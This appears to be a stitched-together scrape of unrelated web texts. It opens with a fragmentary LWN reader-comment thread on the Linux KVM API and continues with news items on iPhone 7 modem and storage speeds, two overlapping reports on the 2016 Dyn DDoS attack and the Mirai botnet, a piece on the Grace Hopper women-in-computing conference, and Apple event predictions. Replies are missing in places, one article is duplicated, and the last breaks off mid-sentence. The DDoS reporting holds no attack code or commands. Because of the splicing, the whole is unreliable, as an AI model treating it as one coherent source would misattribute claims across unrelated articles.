Still around 1500-2000 cycles. For ioeventfd you have to add the latency of waking up the I/O thread if it's sleeping (but if the fd is really busy, e.g. running fio in the guest, it won't have time to go to sleep). Using the KVM API Posted Sep 30, 2015 17:53 UTC (Wed) by josh (subscriber, #17465) [Link] > For ioeventfd you have to add the latency of waking up the I/O thread if it's sleeping (but if the fd is really busy, e.g. running fio in the guest, it won't have time to go to sleep). How much *minimum* latency comes from the vmexit, and how much gets added by the path from the in-kernel vmexit handling and whatever mechanism it uses to contact the I/O thread? If much of it comes from the latter, perhaps we could find a way to accelerate that via another (latency-optimized) interface. Using the KVM API Posted Oct 1, 2015 7:17 UTC (Thu) by pbonzini (subscriber, #60935) [Link] It's about 50-50. Using the KVM API Posted Oct 1, 2015 15:50 UTC (Thu) by josh (subscriber, #17465) [Link] Ouch. That really limits how much faster it can get, then, short of implementing the backend in the kernel. Using the KVM API Posted Oct 1, 2015 16:02 UTC (Thu) by pbonzini (subscriber, #60935) [Link] Even if you implement in the kernel, it's hard to bypass all the stuff that KVM does at vmexit. The processor doesn't restore the whole host state at vmexit time, but KVM must restore at least whatever is needed to run Linux (e.g. the %fs base to access per_cpu variables). Using the KVM API Posted Sep 30, 2015 3:42 UTC (Wed) by voltagex (subscriber, #86296) [Link] > (man, I should send those Jazz Jackrabbit patches upstream...) Yes, yes you should. By the way, can you still buy that game? That and OMF 2097 are my favourites of all time. Using the KVM API Posted Sep 30, 2015 13:46 UTC (Wed) by pbonzini (subscriber, #60935) [Link] I don't know, I play the shareware version. :) Using the KVM API Posted Sep 30, 2015 6:17 UTC (Wed) by eru (subscriber, #2753) [Link] on one hand you don't need near bare-metal performance that KVM provides, because dosemu/dosbox only need to emulate a 100 MHz machine or so, and a simple interpreter or a JIT compiler like QEMU's can handle it Probably true for old games, but the situation I am thinking of involves using ancient cross-compilers to compiler large masses of legacy code for a weird environment that still has to be maintained. One would think (and I did think) this is an I/O-bound operation, but it turned out the speed difference between dosemu with VM86 and dosemu on x86_86 with emulation is very noticeable (order of magnitude for large inputs). On the other hand, dosemu also has advantages, because it can run "headless", can easily access native files, and starts up quickly. These are important features, because the ancient compilers are wrapped in layers that hide their MS-DOS internals, so from the Linux user's point of view they act like normal command-line tools. Using the KVM API Posted Sep 30, 2015 13:46 UTC (Wed) by pbonzini (subscriber, #60935) [Link] What makes you use dosemu or dosbox instead of QEMU (with or without KVM)? Using the KVM API Posted Sep 30, 2015 15:28 UTC (Wed) by eru (subscriber, #2753) [Link] I probably should look into qemu again some day. One problem is file system access. As noted, I want the MS-DOS compilers to transparently compile sources in the Linux file system and write the objects there, and preferably without having to install any network support in the emulated MS-DOS or FreeDOS, so to leave maximum "real" memory for the compilers. Both dosemu and dosbox handle this requirement. Using the KVM API Posted Sep 30, 2015 17:15 UTC (Wed) by felix.s (guest, #104710) [Link] There's vvfat, but QEMU people say it's deprecated, and writing (which has to be manually enabled) currently seems broken. I found a virtio-9p driver for DOS: <http://www.zytor.com/pub/git/dos/virtio9p.git/>, but it's half-done, seems abandoned, and doesn't even compile properly as of now (binutils' fault though; bug 18963). On the other hand, the missing part is mostly the "boring" stuff, which is actually translating DOS file system accesses into 9P protocol exchanges (including file name translation). Maybe you can persuade hpa to get back to it :) Also, funnily enough, some time ago I've been working on a DOS/BIOS ABI layer based on KVM (I tried to make backends interchangeable, but I'm not sure how well I've succeeded), and I think it would be ideal for the use case you describe. I even managed to include a simplistic packet driver, so I can use the FDNPKG package manager to download programs to test. However, the code is currently such a mess that I'm too embarrassed to publish it. Maybe some day... Using the KVM API Posted Sep 30, 2015 17:34 UTC (Wed) by josh (subscriber, #17465) [Link] I've been thinking about using the KVM API to prototype a new virtio filesystem, both for simplicity (this shouldn't need a full network filesystem) and to improve on 9p's very high access latency. (Try building a kernel under virtio-9p, and compare to host performance building the same kernel.) 9p provides reasonable throughput, but not reasonable latency. Given the ability to map guest memory, file data access could occur by mmap()ing the file on the host and then handing that memory to the guest; however, that doesn't address the performance of calls like stat(), which need to run absurdly fast and absurdly often. Using the KVM API Posted Sep 30, 2015 17:49 UTC (Wed) by kvaneesh (subscriber, #45646) [Link] With cache=loose, we should used the cached value in the inode in getattr (v9fs_vfs_getattr_dotl). So stat should be fast. Using the KVM API Posted Oct 1, 2015 6:29 UTC (Thu) by kleptog (subscriber, #1183) [Link] I set up a system locally to run programs under a VM in qemu-kvm with shared folders and it was insanely slow, especially git and find. Stracing on the host showed that for each stat() in the guest, the host was doing a stat() on each directory component. So a stat() of a complete directory tree went O(N^2) on the directory depth. Now, I get that it's probably a configuration issue since it clearly wasn't caching anything, but I found it really hard to find documentation about qemu that explained this behaviour. On top of that I'm managing them via libvirt, so even if I find a command-line option to deal with something, if libvirt doesn't support it I'm still SOL. Overall, it hasn't been a great experience, next time I'll probably do what other people do, use VirtualBox or VMWare. But back to the article, it's a pretty nice interface actually. Hopefully I'll find some reason to use it sometime :) Using the KVM API Posted Oct 8, 2015 16:48 UTC (Thu) by LightDot (guest, #73140) [Link] You can pass raw qemu command line in the libvirt XML.

Using the KVM API Posted Sep 30, 2015 23:04 UTC (Wed) by josh (subscriber, #17465) [Link] Incidentally, with your background in qemu and kvm, perhaps you could explain (or point to documentation explaining) the purpose of KVM_SET_TSS_ADDR and KVM_SET_IDENTITY_MAP_ADDR, and what cases need them? A simple VM works without them, but the documentation lists them both as required for x86 VM setup. Using the KVM API Posted Oct 1, 2015 8:21 UTC (Thu) by pbonzini (subscriber, #60935) [Link] They are needed for unrestricted_guest=0. Remember that, in that case, the VM always runs in protected mode and with paging enabled. In order to emulate real mode you put the guest in a vm86 task, so you need some place for a TSS and for a page table, and they must be in guest RAM because the guest's TR and CR3 points to it. They are invisible to the guest, because the STR and MOV-from-CR instructions are invalid in vm86 mode, but it must be there. If you don't call KVM_SET_TSS_ADDR you actually get a complaint in dmesg, and the TR stays at 0. I am not really sure what kind of bad things can happen with unrestricted_guest=0, probably you just get a VM Entry failure. The TSS takes 3 pages of memory. An interesting point is that you actually don't need to set the TR selector to a valid value (as you would do when running in "normal" vm86 mode), you can simply set the base and limit registers that are hidden in the processor, and generally inaccessible except through VMREAD/VMWRITE or system management mode. So KVM needs to set up a TSS but not a GDT. For paging, instead, 1 page is enough because we have only 4GB of memory to address. KVM disables CR4.PAE (page address extensions, aka 8-byte entries in each page directory or page table) and enables CR4.PSE (page size extensions, aka 4MB huge pages support with 4-byte page directory entries). One page then fits 1024 4-byte page directory entries, each for a 4MB huge pages, totaling exactly 4GB. Here if you don't set it the page table is at address 0xFFFBC000. QEMU changes it to 0xFEFFC000 so that the BIOS can be up to 16MB in size (the default only allows 256k between 0xFFFC0000 and 0xFFFFFFFF). The different handling, where only the page table has a default, is unfortunate, but so goes life...

While I saw the mention of that message in a few places, I don't actually get that message at any point. Presumably that only happens with unrestricted_guest=0? Please consider documenting the use of these two ioctls and the data they point to, as well as what circumstances require them; the current KVM documentation doesn't mention any of that. Using the KVM API Posted Sep 29, 2015 19:16 UTC (Tue) by Cyberax (✭ supporter ✭, #52523) [Link] Wow! This API is actually easy and straightforward. Far, far easier than I'd expect from a system emulator. Using the KVM API Posted Sep 29, 2015 20:17 UTC (Tue) by drag (subscriber, #31333) [Link] Well if you look at what KVM does... all it ultimately does is allow you to execute ring0 code in ring2 on a x86 cpu. That way you don't have to modify the OS kernel to be able to execute it as a application. The alternative is to do what Xen did with Linux and patch it so that you can run the Linux kernel more like a regular application. Previously you had kernel mode and then you had usermode ways to execute code. Now you have a third way, the kvm way. There isn't much to emulate because it's not using emulation at all. It's just executing the code directly on your processor. The only really magic/complicated stuff that happens is to deal with memory addressing for the guest OS. Qemu does all the heavy lifting as far as 'system emulator' goes. Using the KVM API Posted Oct 1, 2015 0:22 UTC (Thu) by rahvin (subscriber, #16953) [Link] If you think about it, this is probably the very reason most of the KVM internals were already in the Linux Kernel when Xen and VmWare were arguing over the "standard" for the changes to the Linux Kernel they needed. It pretty obvious that this is the reason why to me. The changes are straightforward and simple. novm / kvmtool still alive?

I mentioned it only as an example of an interesting project using KVM directly. > kvmtool that I found doesn't seem all that active either. It does most of what people using it want; it tend to grow new features as the KVM API does, grow new architectures when KVM supports them and someone wants to run kvmtool on them, and occasionally gain new drivers. I'd recommend trying kvmtool in its current state; it works quite well. novm / kvmtool still alive?

ARM added support for virtualization as an extension to ARMv7 architecture which later become part of ARMv8. Hardware support for virtualization on ARM is a achieved by: 1. introducing a new CPU privellege level for hypervisors called Hyp or Excpetion Level 2 (EL2). 2. Adding 2nd stage translation to the CPUs MMU 3. Adding support for virtual interrupts to the generic interrupt controller (GIC) 4, Adding support for virtual timer in the ARM architected timer there is a great article from Christopher Dall et all explaining how KVM was ported to ARM http://systems.cs.columbia.edu/files/wpid-asplos2014-kvm.pdf Using the KVM API with ARM?

Using the KVM API Posted Oct 4, 2016 4:15 UTC (Tue) by zlynx (subscriber, #2285) [Link] As far back as I can remember that was the serial port address. It's historical. See COM on Wikipedia.

Using the KVM API Posted Oct 4, 2016 16:51 UTC (Tue) by sahil (guest, #100553) [Link] I initially thought that this number '0x3f8' has a special significance for kvm api, as in, kvm would recognize this address as an memory mapped I/O or some other special address. The truth is that KVM exits due to 'out' opcode, and not because of the address. In the host, we then check the 1st operand of this 'out' opcode matches the value we gave, '0x3f8' in this case. We can have any other number (as long as it is 1 byte long) as operand, thus even 'out 0x4000, al', or 'out 0x0000, al' (intel syntax) would work just fine. Copyright © 2015, Eklektix, Inc.

It has to do with the speed of the phones. Some iPhone 7s were built with a Qualcomm modem, while others have an Intel modem. Research firm Cellular Insights recently found Qualcomm modems work 30 percent better than their counterparts. SEE MORE: Tim Cook Sees iPhones Everywhere, Even In A 17th-Century Painting And if you want to make sure you get the faster phone, you'd have to consider switching phone carriers. Verizon, Sprint and SIM-free models have the Qualcomm modem. Phones from AT&T, T-Mobile and Telstra have the Intel hardware. Before you start feeling cheated, you should probably know that this isn't a first for Apple. You might remember not too long ago that one iPhone model had a variation in its processors. Plus, the difference in speeds in the iPhone 7 isn't that noticeable. Cellular Insights found the Intel modems were roughly the same speed as the iPhone 6S.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com." Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed," said Read. Dyn provides services to some 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to their actions were "good," presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually. Secure your website and get better servers, otherwise be attacked again," he said. For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption.

Local Submit Event Search « Cubs Looking for Magic Season to Continue | Main | More Children Being Hospitalized with Headaches » Saturday Oct222016 Report: 32gb iPhone 7 Slower than Other Models Saturday, October 22, 2016 at 10:09AM Not all iPhone 7s are born equally, according to new tests, which appear to show the cheapest, 32GB versions are significantly slower than the more expensive 128 or 256GB versions and that some have much poorer 4G reception. Testing by both GSMArena and Unbox Therapy found that the speed of the storage within the 32GB iPhone 7 is significantly slower than that in the more expensive 128GB iPhone 7. Reading data from the storage of the 32GB version of the iPhone 7 was 200Mbps slower than the 12GB version, 656Mbps and 856Mbps respectively. The difference in read speed over 600Mbps is unlikely to be noticeable in day-to-day usage. However, writing to the storage – saving data including photos, videos, music, apps or any other type of file – was found to be significantly slower on the 32GB iPhone. The 128GB iPhone 7 wrote to memory at 341Mbps, but the 32GB iPhone 7 was over eight times slower at just 42Mbps. GSMArena found similar results in its testing of the iPhone 7, with a 32GB iPhone 7 Plus reaching write speeds of only 39.6Mbps compared with a 128GB iPhone 7 writing at speeds of 308Mbps. Meanwhile, testing of different versions of the iPhone 7 Plus have also apparently revealed discrepancies in their cellular performances. According to New York-based Cellular Insights, which conducted tests using networking equipment, the iPhone 7 Plus smartphones with model numbers A1778 and A1784, including those available in the UK and Europe, performed noticeably poorer than those with model numbers A1660 and A1661, including those available in the US. A1778 and A1784 iPhone 7 Plus smartphones have an Intel modem chip that connects them to the 4G network, while the A1660 and A1661 models use a modem supplied by Qualcomm, a common supplier of modems and processors to many Android smartphones, including the new Google Pixel. The Intel iPhone 7 Plus models showed at least 30% worse network performance, and in some cases as poor as 75% worse, than the Qualcomm iPhone 7 Plus models. This performance gap means that the Intel iPhone 7 Plus models will have poorer 4G reception than the Qualcomm versions and slower download and upload speeds. Milan Milanović from Cellular Insights said: “In all tests, the iPhone 7 Plus with the Qualcomm modem had a significant performance edge over the iPhone 7 Plus with the Intel modem. We are not sure what was the main reason behind Apple’s decision to source two different modem suppliers for the newest iPhone.” In Cellular Insights further testing, it showed that the Intel iPhone 7 Plus models had worse reception than the iPhone 6S in the majority of signal conditions. Most of the time users blame mobile phone operators when the signal drops out on their smartphone or data speeds are slow, but the testing indicates that depending on smartphone model, it might not always be the fault of the network provider.

A massive cyberattack that compromised major websites on Friday was waged through hundreds of thousands of web-connected devices – the so-called Internet of Things. The type of attack, known as DDoS, crashes websites and services by overwhelming them with large amounts of traffic. Such attacks are usually mounted using computers that were previously infected with a virus. This time, however, the hackers extended the method to a wide variety of devices connected to the internet, including security cameras, webcams, DVRs and even baby monitors. More on Internet of Things: Meet the Israeli startups connecting the internet to everything | Intel creating Internet of Things’ lab in Haifa A Politico report said that sources in the U.S. claiming to be affiliated with the hacking collective Anonymous and with a group named New World claimed the attack. They said it was revenge for cutting Wikileaks founder Julian Assange's internet. Ecuador on Tuesday acknowledged it had restricted internet access for Assange, who has lived in its London embassy since mid-2012, over the publication of hacked emails linked to U.S. Democratic presidential candidate Hillary Clinton. However, the report said experts doubt the group was in fact behind the attack, saying in the past both groups  falsely claims responsibility for cyber attacks. Smart appliances on display at an electronics show. They may look like refrigerators to you, but for hackers they're cyberattack weapons.Chris Ratcliffe, Bloomberg Wikileaks responded with a tweet requesting their supports to cease the attack. "Mr. Assange is still alive and WikiLeaks is still publishing. We ask supporters to stop taking down the US internet. You proved your point," the tweet said. In 2010, banks and other firms cut ties with Wikileaks after it published the leaked Bradley Manning files and a 2007 video of a U.S. apache helicopter mistakenly shooting several Iraqi civilians. Anonymous hackers attacked the firms in response, crippling their online operations. Since then, many hacking groups across the world, and also in Israel, identified as part of Anonymous. The attacks struck Twitter, Paypal, Netflix and other customers of an infrastructure company in New Hampshire called Dyn, which acts as a switchboard for internet traffic. skip - How It Works: Internet of Things. According to Flashpoint, a cybersecurity firm, the hackers used malware called Mirai, which takes over unsuspecting people's web-connected devices and turns them into a network that can be used in a cyberattack. The Internet of Things is a fertile ground for hackers, says Ziv Gadot, CEO of Red Button, a cybersecurity firm that specializes in DDoS attacks. These devices contain computers and are connected to the internet, but their security is still "in diapers," he says.  "Anything that may look like a tea kettle, a refrigerator or a security camera to you, is seen by hackers as a computer that can be connected to a network of tens of thousands or hundreds of thousands of other computers ready for zero hour," Gadot explains. "And when the time comes, they generate an overload of requests beyond what even a strong service like Dyn can handle." According to Dyn, the cyberattack consisted of three heavy assaults from millions of unique IP addresses, making it one of the largest attacks ever seen. Each part of the attack came from different sources, which made it difficult to block.  Attacking a large domain name service provider like Dyn can create massive disruptions because such firms are responsible for forwarding large volumes of internet traffic. Friday's outages were intermittent and varied by geography. Users complained they could not reach dozens of internet destinations including Mashable, CNN, the New York Times, the Wall Street Journal, Yelp and some businesses hosted by Amazon.com Inc. Spotify, Airbnb, and Reddit were down as well. The outages began in the eastern United States and then spread to other parts of the country and Europe. Dyn said it had resolved one morning attack on Friday, which disrupted operations for about two hours, but disclosed a second a few hours later that was causing further disruptions. By evening it was fighting a third. The Mirai malware code was recently leaked online, which made it easier for hackers to use and even more difficult for cybersecurity firms and agencies to deal with. Following the leak, the U.S. Department of Homeland Security issued a warning about attacks from the Internet of Things last week.  The disruptions come at a time of unprecedented fears about the cyber threat in the United States, where hackers have breached political organizations and election agencies.

Women in tech: Why the small victories matter 0 Share: Tech Industry by Erin Carson October 22, 2016 5:00 AM PDT @erincarson Up Next Does the internet have a fake-news problem? The Grace Hopper Celebration of Women in Computing aims to create a better culture in the industry for the next generation of female geeks. Photo by Brent Lewis/Getty Images If you're wondering where all the women in tech are, this week the easy answer was Houston, Texas -- at the Grace Hopper Celebration of Women in Computing. It's an annual conference hosted by the Anita Borg Institute, an organization focused on the advancement of women in technology. The event is named for Grace Hopper, a rear admiral in the US Navy who helped create the COBOL programming language, among other achievements. This year, 15,000 attendees, mostly women, with about 1,000 men thrown in, congregated for three days of speakers, workshops and as much branded swag as they could stuff in a tote bag. And, hopefully, some job opportunities. In the past, the event has gotten attention for attracting big names and, occasionally, trouble. Two years ago, Microsoft CEO Satya Nadella incurred much ire for telling women they should trust the system instead of asking for raises. Last year, YouTube CEO Susan Wojcicki talked about sending her disgruntled daughter to an all-girls coding camp. This year, the word on everyone's lips is progress. In just one year, the conference has grown by about 3,000 attendees. Side chatter revolves around how refreshing it is to be around so many other women. And when a speaker like Intel CEO Brian Krzanich mentions something like men taking credit for women's ideas in meetings, the crowd chuckles. They know exactly what he's talking about. The way out of this problem is to not lose heart, a message the conference continually reinforces. "If we don't celebrate the wins, we lose sight of the bigger picture," said Reshma Saujani, founder of nonprofit education program Girls Who Code. "Celebration" might seem like an offbeat way to put it. A conference is a conference, after all, but considering the current climate in tech, women in the industry might need a positive boost more than ever. A report came out Thursday from Girls Who Code and consulting firm Accenture projecting that women's share of tech jobs in the US could fall, amounting to only one in five by 2025. Maybe it shouldn't come as a surprise. In 1984, 37 percent of computer science majors were women. That number steadily dropped and now stands at about 18 percent. As much as the industry is finally talking about the dearth of women in tech, no one is really considering that the situation could get worse. The report also found that the salary gap between men and women in the US widened even further, from $8,540 in 2011 to $12,661 in 2015. 'Sisterhood matters' The news is seldom good. Published diversity and inclusion reports show that tech companies struggle to get their technical workforces up to even 30 percent women. The obstacles multiply, and even the youngest attendees seem to know it. Discouragement is a bear. So the Grace Hopper conference tries to keep the good vibes flowing. "We know sisterhood matters in sparking and sustaining girls' interest in computing as they move through the pipeline," said Saujani, a Grace Hopper regular, who appeared on a panel last year with Chelsea Clinton, Twitter CEO Jack Dorsey and Facebook's director of global diversity, Maxine Williams. A few minutes before IBM CEO Ginni Rometty took the stage for her keynote speech on Wednesday, a college student named Alyssia Jovellanos accepted the Student of Vision ABIE Award from the Anita Borg Institute and talked to a packed arena about how important it is to have role models. Cisco sponsored a disco. The Microsoft brigade wore blindingly blue T-shirts. Attendees struck up conversations without reservation. A sophomore from the College of William and Mary in Virginia told me she'd made up her mind to get a master's degree -- partly because of the conversations she's had with people here, partly to make up for the fact she'll probably earn less because, you know, she's a woman. A technical conference Anita Borg, who passed away in 2003, and Anita Borg Institute CEO Telle Whitney started GHC in 1994, with a whopping 500 attendees. "There was a lot of teeth gnashing about the lack of women in the sciences," Whitney said of the early days of the conference. Over time, the conference has sought to balance the more on-the-nose sessions about being a woman in tech with technical sessions. So Grace Hopper was a place to get advice on how to deal with unconscious biases in the workplace or to attend a session on computer simulations for drug discovery, or data management or cybersecurity. Last year I wandered into a session on virtual-reality analytics. My liberal arts education and I slunk out after about four PowerPoint slides of algorithms. But think back to that stat on the percentage of women computer science majors out there. These sessions might be some of the only educational spaces these women will enter where they're not one of only a few women in the room. The future of women in tech GHC might be only once a year, but Whitney hopes the effects take hold beyond that. After all, the conversation around diversity in tech is one about culture change. There's a reason why speakers like Lyndsay Pearson, from video game maker Electronic Arts, preach topics like building inclusion into gaming. The bones of the industry have to be reset. At Grace Hopper, that reset starts with an expo floor packed with recruiters from companies looking to hire attendees. The booths are bright, the smiles are big, young women in skirts and flats walk around with resumes, trying to imagine themselves working anywhere from Bank of America to Airbnb -- and they have a fair shot at doing so. Even Walmart has a booth. Saujani is one of many who believes life will be better with the power of tech on women's side. "The idea that they can use technology to further their interests opens up so many more pathways for keeping girls engaged in the long run," she said. The conference sends a loud message that there are women in this industry and that they can, despite it all, find success. Sometimes that starts with a conversation at lunch, bonding over a slice of pizza, or by getting to ask a notable figure how she deals with imposter syndrome, the feeling that others will realize you're not good enough to be where you are. To a large degree, it's also about being able to stand in a room, do a 360-degree turn and see a few thousand other women in tech.

(AAPL) Will Kill Why Tesla Motors Inc (TSLA) Ended the Free Supercharger Ride Apple Inc.’s (AAPL) New MacBook Pro Is Actually a Monster Hit Recent Posts: Apple Inc. (AAPL) Could Launch Apple Glasses by 2018 The Next Thing Apple Inc. (AAPL) Will Kill Why Tesla Motors Inc (TSLA) Ended the Free Supercharger Ride View All Posts As had been expected, Apple Inc. (NASDAQ:AAPL) finally sent out media invitations to a special event, to be held on Oct. 27. What will AAPL announce? We’re pretty sure a new MacBook Pro is going to be unveiled. There’s likely to be more Apple gear making an appearance, too, and at least one popular Apple product is not long for this world. Source: Apple Whether because of the distraction of new products like the iPhone 7, or a lack of key components like new mobile CPUs, Apple has let its Mac hardware languish. And sales have suffered as a result. Apple’s late-October event seems likely to be focused on playing catch up, and finally releasing new Mac models. New MacBook Pro This is as close to a “given” as you get with an Apple event. The MacBook Pro is a key product aimed at professional users and it hasn’t been updated in a year and a half. The internet has been buzzing with spy shots showing an intriguing OLED strip of function keys. Also expect USB-C ports in place of the existing full-sized USB and Thunderbolt ports, and AAPL will likely turn to USB-C for power as well. New mobile Skylake CPUs from Intel Corporation (NASDAQ:INTC) are ready and should be powering the laptop. The new MacBook Pro is expected to be thinner, lighter and more powerful than ever. MacBook Air Once the star of AAPL’s notebook lineup, the MacBook Air is in serious need of an overhaul. Its display dates to 2012 and it last saw a meaningful upgrade in 2015. 7 Tech Stocks That Will Ride Healthcare to Riches Rumors are flying that Apple is going to discontinue the 11-inch MacBook Air. If the company keeps the 13-inch MBA as the new entry level Mac laptop, it may get a CPU upgrade and possibly make the switch to USB-C. But it seems doubtful Apple will bother to upgrade that screen. iMac Apple’s sleek all-in-one desktop computer is another strong candidate to be featured. It’s been a year since the last upgrade. The iMac could be in line to receive a new CPU, new graphic card options and possibly some USB-C ports. Apple is big on USB-C, after all. With Microsoft Corporation (NASDAQ:MSFT) apparently poised to unleash its hardware design chops with a Surface PC aimed squarely at the iMac, AAPL would be foolish to leave this Mac to sit with its outdated specs for any longer. Long Shots While a new MacBook Pro is pretty much a shoe-in for the Apple Event, there are also some long shots. AAPL could unveil a new Mac Pro and/or Mac Mini. It has literally gone for years without upgrading these machines. Even throwing in a current generation Intel CPU would go a long way toward preserving some sense of relevance for these Macs. Another long shot is a new 5K monitor to replace Apple’s only monitor (the Thunderbolt Display), which was discontinued earlier this year. AAPL has reportedly been in talks with LG about producing a new 5K display that would bear the Apple logo. Non-Mac Hardware While new Mac announcements are expected to headline, a new Apple TV is a possibility at the Oct. 27 event. The current streamer is a year old, and the entry-level third generation model AAPL kept around has been dropped. It seems unlikely Apple would go into the holiday season against competition like Alphabet Inc’s (NASDAQ:GOOG, NASDAQ:GOOGL) new $69, 4K Chromecast Ultra with the current Apple TV — which starts at $149 and maxes out at 1080p. What to Expect From Microsoft’s October Event Other non-Mac long shots include a Siri-powered competitor to the Amazon.com, Inc. (NASDAQ:AMZN) Echo and Google Home connected speakers, and a revised Apple Wi-Fi router (the Airport Extreme is now over three years old). Circle back on Oct. 27 to find out which of our predictions turn out to be correct. We’ll have a full recap of the Apple event, including the new MacBook Pro and any other announcements. As of this writing, Brad Moon did not hold a position in any of the aforementioned securities. More From InvestorPlace: It’s Time for New Macs — Apple Inc.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn’t be verified. Play Video Saturday Who is behind cyberattack on U.S. websites? James Norton, founder and president of Play-Action Strategies, a cybersecurity firm, joins "CBS This Morning: Saturday" to discuss the New World ... Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. “The complexity of the attacks is what is making it so difficult for us,” said Kyle York, the company’s chief strategy officer. “What they are actually doing is moving around the world with each attack.” He said an East Coast data center was hit first; attacks on an offshore target followed later. CBS News homeland security consultant Fran Townsend pointed to Russia as a possible instigator. “Is this sort of a brushback pitch from the Russians sending us a message that we should be pretty careful about engaging in this sort of cyberactivity with them because they are very capable,” she said. The FBI and the Department of Homeland Security told CBS News they were investigating “all potential causes,” but they have not gone as far as to say that this was a state-sponsored attack. The data flood came from tens of millions of different Internet-connected machines - including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as “twitter.com.” Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn’t matter that the store is fully open or operational if you have no idea how to get there,” he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. “We’ve been monitoring Dyn for years and this is by far the worst outage event that we’ve observed,” said Read. Dyn provides services to some 6 percent of America’s Fortune 500 companies, he said. A full list of affected companies wasn’t immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected “zombie” computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. “We didn’t do this to attract federal agents, only test power,” two collective members who identified themselves as “Prophet” and “Zain” told an AP reporter via Twitter direct message exchange. They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday’s onslaught. The collective has also claimed responsibility for cyberattacks against the Islamic State of Iraq and Syria, or ISIS. The two said about 30 people have access to the NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed to their actions were “good,” presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group - or at least he - sought only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand actually. Secure your website and get better servers, otherwise be attacked again,” he said. For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet - closed-circuit video cameras, digital video recorders and even thermostats - that were infected with malware. “The Internet of Things sort of ran way ahead of how the Internet was architected,” Dyn’s York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. “It is a very smart attack. As we start to mitigate they react and start to throw something that’s over the top,” York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. “Prophet” of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. “We’ve stopped all our attacks,” he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH. In a widely shared essay titled “Someone Is Learning How to Take Down the 